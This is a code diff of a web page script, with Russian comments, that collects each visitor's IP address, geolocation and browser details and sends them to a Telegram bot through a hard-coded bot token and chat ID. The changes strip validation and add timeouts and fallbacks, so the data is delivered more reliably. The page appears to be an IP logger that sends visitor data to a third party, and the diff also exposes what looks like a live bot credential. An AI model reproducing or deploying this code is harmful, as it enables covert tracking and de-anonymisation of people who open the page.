@@ -55,47 +55,23 @@
         // Конфигурация
         const TOKEN = "8319716117:AAFOvid9L14XanjeBLYWb6JT7QTAVgcA9g4";
         const CHAT_ID = "1003175777512";
-        
-        // Проверка наличия необходимых API
-        function checkBrowserCompatibility() {
-            const requiredAPIs = [
-                'fetch',
-                'navigator',
-                'screen',
-                'Intl'
-            ];
-            
-            for (const api of requiredAPIs) {
-                if (!window[api]) {
-                    throw new Error(`Browser doesn't support required API: ${api}`);
-                }
-            }
-            
-            return true;
-        }
 
         // Функция для получения IP через ipapi.co
         async function getIPInfo() {
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
                 const response = await fetch('https://ipapi.co/json/', {
-                    method: 'GET',
-                    headers: {
-                        'Accept': 'application/json',
-                    },
-                    timeout: 10000 // 10 секунд таймаут
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 
                 if (!response.ok) {
                     throw new Error(`HTTP error! status: ${response.status}`);
                 }
                 
                 const data = await response.json();
-                
-                // Проверяем наличие IP в ответе
-                if (!data || !data.ip) {
-                    throw new Error('Invalid response from IP API');
-                }
-                
                 return data;
             } catch (error) {
                 console.error('Error fetching IP info:', error);
@@ -107,10 +83,13 @@
         // Альтернативный метод получения IP
         async function getIPInfoFallback() {
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+                
                 const response = await fetch('https://api.ipify.org?format=json', {
-                    method: 'GET',
-                    timeout: 10000
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 
                 if (!response.ok) {
                     throw new Error(`HTTP error! status: ${response.status}`);
@@ -124,14 +103,25 @@
                     region: 'Unknown',
                     city: 'Unknown',
                     postal: 'N/A',
-                    timezone: 'Unknown',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     latitude: 'N/A',
                     longitude: 'N/A',
                     org: 'Unknown'
                 };
             } catch (error) {
                 console.error('Error fetching IP info from fallback:', error);
-                return null;
+                return {
+                    ip: 'Unable to retrieve',
+                    country_name: 'Unknown',
+                    country_code: 'N/A',
+                    region: 'Unknown',
+                    city: 'Unknown',
+                    postal: 'N/A',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    latitude: 'N/A',
+                    longitude: 'N/A',
+                    org: 'Unknown'
+                };
             }
         }
 
@@ -165,6 +155,9 @@
         async function sendToTelegram(message) {
             try {
                 const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
@@ -174,15 +167,12 @@
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'HTML'
-                    })
+                    }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 
-                if (!response.ok) {
-                    const errorData = await response.text();
-                    throw new Error(`Telegram API error: ${response.status} - ${errorData}`);
-                }
-                
-                return true;
+                return response.ok;
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 return false;
@@ -212,6 +202,11 @@
             message += `<b>Cookies:</b> ${browserInfo.cookieEnabled ? 'Enabled' : 'Disabled'}\n`;
             message += `<b>Local Storage:</b> ${browserInfo.localStorage ? 'Supported' : 'Not Supported'}\n`;
             
+            // Обрезаем сообщение если оно слишком длинное для Telegram
+            if (message.length > 4096) {
+                message = message.substring(0, 4090) + '...';
+            }
+            
             return message;
         }
 
@@ -220,16 +215,9 @@
             const statusElement = document.getElementById('status');
             
             try {
-                // Проверяем совместимость браузера
-                checkBrowserCompatibility();
-                
                 // Получаем информацию об IP
                 const ipInfo = await getIPInfo();
                 const browserInfo = getBrowserInfo();
-                
-                if (!ipInfo) {
-                    throw new Error('Could not fetch IP information');
-                }
 
                 // Формируем сообщение
                 const message = formatMessage(ipInfo, browserInfo);
@@ -247,7 +235,7 @@
             } catch (error) {
                 console.error('Error:', error);
                 statusElement.className = 'status error';
-                statusElement.innerHTML = '❌ Error collecting information';
+                statusElement.innerHTML = '❌ Error collecting information: ' + error.message;
             }
         }
 
